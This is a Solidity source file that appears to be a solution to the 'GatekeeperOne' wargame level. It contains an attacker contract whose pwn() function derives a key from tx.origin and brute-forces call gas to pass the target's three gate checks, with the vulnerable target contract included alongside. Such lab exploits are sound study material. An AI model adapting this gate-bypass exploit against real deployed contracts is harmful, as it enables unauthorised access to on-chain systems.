// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fatekeeper {
    GatekeeperOne target;
    address targetAddress; 
    constructor(address _target) {
        target = GatekeeperOne(_target);
        targetAddress = _target;
    }

    function generateKey() internal view returns (bytes8) {
        bytes8 originatorSequence = bytes8(uint64(uint160(tx.origin)));
        uint16 k = uint16(uint64(originatorSequence));
        uint64 k2 = uint64(1 << 63) + uint64(k);

        return bytes8(k2);  
    }

    function pwn() external returns (bool) {
        bytes8 key = generateKey();
        uint gasNumber;
        for (uint i = 0; i < 8191; i++) {
            try target.enter{gas:(8191 * 100)  + i}(key) returns (bool succ) {
                gasNumber = (8191 * 100) + i;
            } catch  {
                continue;
            }
        }
        bool success = target.enter{gas:gasNumber}(key);

        if (success == true) {
            return true;
        } else {
            return false;
        }
    }
}

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}